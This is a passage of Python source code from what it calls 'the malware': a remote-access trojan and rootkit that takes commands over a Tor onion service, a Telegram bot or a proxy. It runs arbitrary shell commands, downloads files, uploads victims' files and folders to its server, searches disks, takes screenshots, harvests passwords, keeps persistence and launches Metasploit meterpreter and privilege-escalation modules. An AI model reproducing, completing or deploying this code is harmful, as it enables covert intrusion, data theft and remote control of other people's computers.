            logging.error("Error while testing the request method: " + str(e))
            self.request_method_is_alive = False

    def test_telegram_method(self):
        try:
            self.telegram_method = TelegramCommunication(self.targetInfo)
            if self.telegram_method.handshake():
                self.telegram_method_is_alive = True
                logging.debug('The telegram method is working')
        except Exception as e:
            logging.error("Error while testing the telegram method: " + str(e))
            self.telegram_method_is_alive = False

    def test_proxy_method(self):
        try:
            self.proxy_method = ProxyMethod(self.targetInfo)
            if self.proxy_method.handshake():
                self.proxy_method_is_alive = True
                logging.debug('The proxy method is working')
        except Exception as e:
            logging.error("Error while testing the proxy method: " + str(e))
            self.proxy_method_is_alive = False

    def request_command(self):
        return self.used_communication.request_command()

    def send_results(self, results):
        if not type(results) != "<class 'str'>":
            logging.warning('We tried to send non string result: ' + str(results))
        else:
            return self.used_communication.send_results(results)

    def download_file(self,
                      file):  # We download a file from the server to the client, the file must be in the Support folder
        data = self.used_communication.download_file(file)
        with open(file, 'w') as file2:
            file2.write(data)
            file2.close()

        if os.path.exists(file):
            return '{} has been downloaded'.format(file)
        else:
            return 'Error to download {}'.format(file)

    def upload_file(self, file):  # We download a file from the client to the server, require the full path of the file
        if not os.path.exists(file):
            DefineCommunication.send_results(self, 'The file cannot be found on the system, aborting...')
            raise Exception
        else:
            basepath = os.path.split(file)
            folder = os.path.split(basepath[0])[1]
            with open(file, 'r') as openfile:
                data = openfile.read()
                openfile.close()
            file = basepath[1]
            return self.used_communication.upload_file(file, folder, data)

    def main(self):
        # Testing all the possibility of communication
        DefineCommunication.test_request_method(self)
        DefineCommunication.test_telegram_method(self)
        DefineCommunication.test_proxy_method(self)

        # Define the best connexion
        DefineCommunication.co_hierarchy(self)


########################################################################################################################
# This part handle the communication with outside
class GlobalCommunication:
    def __init__(self, targetinfo, define_communication, managejson):
        self.targetInfo = targetinfo
        self.cmd = ''
        self.define_communication = define_communication
        self.manage_json = managejson

    def receive_msg(self):
        command = self.define_communication.request_command()
        while not command:
            command = self.define_communication.request_command()
            time.sleep(2)
        logging.debug("Received command: " + command)
        message, _, action = command.partition(' ')
        if message != self.cmd:
            self.cmd = message
            print(command)
        else:
            self.cmd = 'wait'

        if self.cmd == "downloadfile":
            results = self.define_communication.download_file(action)

        elif self.cmd == 'uploadfile':
            results = self.define_communication.upload_file(action)

        elif self.cmd == 'uploadfolder':  # the same folder need to be created on the server side
            if not action:
                results = "precise the folder you want to download"
            else:
                module = UploadServer(self.define_communication, action)
                results = module.main()

        elif self.cmd == 'selfdestruct':
            a = Persistence(self.targetInfo)
            a.selfdestruct()
            results = a.check()

        elif self.cmd == "actif":
            results = self.manage_json.change_json("status", "actif")

        elif self.cmd == 'passif':
            results = self.manage_json.change_json("status", "passif")

        elif self.cmd == 'log':
            results = self.define_communication.upload_file(os.path.join(os.getcwd(), 'update.json'))

        elif self.cmd == "reboot":
            results = self.manage_json.reboot()

        elif self.cmd == 'survey':
            results = self.targetInfo.print_survey()

        elif self.cmd == 'execute':
            results = execute(action)

        elif self.cmd == 'wget':
            results = wget(action)

        elif self.cmd == 'search':
            # TESTED OK
            command = 'dir "\*{}*" /s'.format(action)
            with open('search_results.txt', 'w') as file:
                file.write(str(execute(command).encode("ISO-8859-1", "replace")))
                file.close()
            if os.path.exists('search_results.txt'):
                results = self.define_communication.upload_file('search_results.txt')
                os.remove('search_results.txt')

        elif self.cmd == 'screenshot':
            results = screenshot(self.targetInfo)

        elif self.cmd == 'deployment':
            module = CreateTorWebsite(self.define_communication, self.targetInfo)
            results = module.main()

        elif self.cmd == 'changetargetinfo':
            pass

        elif self.cmd == 'python':
            pass

        elif self.cmd == 'wait':
            results = False

        else:
            results = "Command not understood"

        if results:
            print(self.define_communication.send_results(results))


class XmlRpcLibMethod:

    def __init__(self, targetinfo):
        logging.debug("trying to connect to {0} on port {1}".format(ip, port))
        self.server = xmlrpclibclient.ServerProxy("http://{0}:{1}".format(ip, port))
        self.cmd = ''
        logging.info("Use of Communication class")
        if self.server.handshake():
            logging.debug("Connected to the server")
            print('Connected to the server')
        else:
            logging.warning("not connected to the server")
            print('not connected to the server')


class RequestMethod:

    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.session = requests.session()
        self.session.proxies = {'http': 'socks5h://127.0.0.1:9150'}

    def checktorcircuit(self):
        tor_circuit = TorCircuit(self.targetInfo)
        if not self.targetInfo.tor_is_running:
            tor_circuit.start_tor_circuit()

        if not tor_circuit.check_tor():
            self.targetInfo.tor_is_running = False
            logging.warning('Tor is not running, we give up RequestMethod')
            raise Exception
        else:
            self.targetInfo.tor_is_running = True

    def handshake(self):
        answer = self.session.post(
            "http://{0}/handshake".format(self.targetInfo.external_onion_url),
            data={'test': 1})
        if answer.json()['handshake'] == 'True':
            return True
        else:
            return False

    def request_command(self):
        answer = self.session.post(
            "http://{0}/request_command".format(self.targetInfo.external_onion_url),
            data={'test': 1})
        print(answer.text)
        return answer.text

    def send_results(self, results):
        answer = self.session.post(
            "http://{0}/send_results".format(self.targetInfo.external_onion_url),
            data={'results': results})

        if answer.text == 'ok':
            logging.debug('Results have been received by the server')
        else:
            logging.debug('Results did not get upload on the server')

    def download_file(self, file):
        print("RM: " + file)
        answer = self.session.post(
            "http://{0}/download_file".format(self.targetInfo.external_onion_url),
            data={'name': file})

        return answer.json()['data']

    def upload_file(self, name, folder, data):
        print('RequestMethod uploadfile')
        print('folder: ' + folder)
        answer = self.session.post(
            "http://{0}/upload_file".format(self.targetInfo.external_onion_url),
            data={'name': name, 'folder': folder, 'data': data})

        print('[RM]' + answer.text)
        return '[RM]' + answer.text


class TelegramCommunication:

    def __init__(self, targetinfo):
        self.targetInfo = targetinfo
        self.URL = "https://api.telegram.org/bot{}/".format(self.targetInfo.telegram_token)
        self.chat_id = ''

    def get_url(self, url):
        response = requests.get(url)
        content = response.content.decode("utf8")
        return content

    def get_json_from_url(self, url):
        content = TelegramCommunication.get_url(self, url)
        js = json.loads(content)
        return js

    def get_updates(self):
        url = self.URL + "getUpdates"
        js = TelegramCommunication.get_json_from_url(self, url)
        return js

    def get_last_chat_id_and_text(self, updates):
        num_updates = len(updates["result"])
        last_update = num_updates - 1
        text = updates["result"][last_update]["message"]["text"]
        chat_id = updates["result"][last_update]["message"]["chat"]["id"]
        return text, chat_id

    def handshake(self):
        command, self.chat_id = TelegramCommunication.get_last_chat_id_and_text(self,
                                                                                TelegramCommunication.get_updates(self))
        if command:
            return True
        else:
            return False

    def send_results(self, results):
        url = self.URL + "sendMessage?text={}&chat_id={}".format(results, self.chat_id)
        TelegramCommunication.get_url(self, url)

    def request_command(self):
        command, self.chat_id = TelegramCommunication.get_last_chat_id_and_text(self,
                                                                                TelegramCommunication.get_updates(self))
        return command

    def upload_file(self, file):
        telegram_bot = telepot.Bot(self.targetInfo.telegram_token)
        telegram_bot.sendDocument(self.chat_id, open(file, 'rb'))
        return '[TC]Document sent'


########################################################################################################################
# This part is for global management of the malware


class ManageJson:

    def __init__(self, targetinfo, status='actif'):
        self.json_data = {}
        self.targetinfo = targetinfo
        self.status = status
        logging.info("Use of ManageJson class")

    def check_json(self):
        if not os.path.isfile('update.json'):
            logging.debug('Unable to find the json file, no problem it will be created')
            with open("update.json", 'w') as outfile:
                json.dump({"id": 0, "rootkit_dir": self.targetinfo.selfname, "servant": False, "servant1": "",
                           "status": self.status}, outfile)
            with open('update.json', 'r') as f:
                self.json_data = json.load(f)
        else:
            with open('update.json', 'r') as f:
                self.json_data = json.load(f)
        return self.json_data

    def send_rootkitjson(self):
        return os.path.join(os.path.dirname(self.json_data['rootkit_dir']), 'update.json')

    def reboot(self):
        print(ManageJson.send_rootkitjson(self))
        try:
            os.remove(ManageJson.send_rootkitjson(self))
        except FileNotFoundError:
            pass
        return 'Json file has been deleted'

    def change_json(self, key, value):
        with open(ManageJson.send_rootkitjson(self), 'r') as f:
            data = json.load(f)

        with open(ManageJson.send_rootkitjson(self), 'w') as outfile:
            data[key] = value
            json.dump(data, outfile)

        logging.debug("the json key {0} was converted to {1}".format(key, value))
        return "the json key {0} was converted to {1}".format(key, value)


class FullSystem:

    def __init__(self, targetinfo, definecommunication, status="actif"):
        logging.info('Use of the Fullsystem')
        self.targetInfo = targetinfo
        self.status = status

        self.manageJson = ManageJson(self.targetInfo)
        self.json_data = self.manageJson.check_json()

        self.defineCommunication = definecommunication
        self.communication = GlobalCommunication(self.targetInfo, self.defineCommunication, self.manageJson)

    def actif(self):
        if self.json_data['servant']:
            print('The actual malware is a servant')
            logging.debug('The actual malware is a servant')
            setup(self.defineCommunication)
            module = Password()
            module.main()
            while True:
                print('start servant loop')
                self.json_data = self.manageJson.check_json()
                if not self.targetInfo.os.startswith('lin'):
                    monitoring = Monitoring(self.targetInfo)
                    monitoring.servant()
                self.communication.receive_msg()

        elif not self.json_data['servant']:
            print('The actual malware is a rootkit')
            logging.debug('The actual malware is a rootkit')
            persistence = Persistence(self.targetInfo)
            self.json_data = self.manageJson.check_json()
            monitoring = Monitoring(self.targetInfo)
            while True:
                print('start rootkit loop')
                self.json_data = self.manageJson.check_json()
                if not self.targetInfo.os.startswith('lin'):
                    monitoring.rootkit()
                    """if persistence.check_persistence():
                        logging.debug("the persistence is on")
                    else:
                        logging.warning('the persistence is not set')"""
                self.defineCommunication.upload_file("update_log.txt")
                time.sleep(5)
        else:
            self.json_data = self.manageJson.check_json()
            logging.warning('Unable to determine the role of this malware')

    def passif(self):
        logging.debug('Sleep status enabled for rootkit, waiting for new instructions...')
        self.defineCommunication.upload_file("update_log.txt")
        GlobalCommunication.receive_msg()
        monitoring = Monitoring(self.targetInfo)
        monitoring.rootkit()
        sys.exit()

    def main(self):
        if self.json_data['status'] == 'actif':
            logging.debug("Status actif on")
            FullSystem.actif(self)
        else:
            logging.debug("Status passif on")
            FullSystem.passif(self)


def normal_launching():
    count = 0
    while count < 10:
        try:
            connexion = DefineCommunication(targetInfo)
            connexion.main()
            module = FullSystem(targetInfo, connexion, "actif")
            module.main()
        except json.decoder.JSONDecodeError as e:
            logging.error(str(e))
            os.remove("update.json")
        except ConnectionRefusedError as e:
            logging.error(str(e))
            print('no connection: ' + str(e))
            # time.sleep(3600)

        except Exception as e:
            print(traceback.format_exc())
            logging.error(traceback.format_exc())

        if connexion:
            connexion.upload_file("update_log.txt")
        count += 1

    # os.remove(targetinfo.selfname)
    sys.exit()


########################################################################################################################
# Cette partie va lancer les différents modules

if __name__ == '__main__':
    msf = MsfRpcConnexion()
    msf.meterpreter_connexion()
    msf.metasploit_esclation_modules()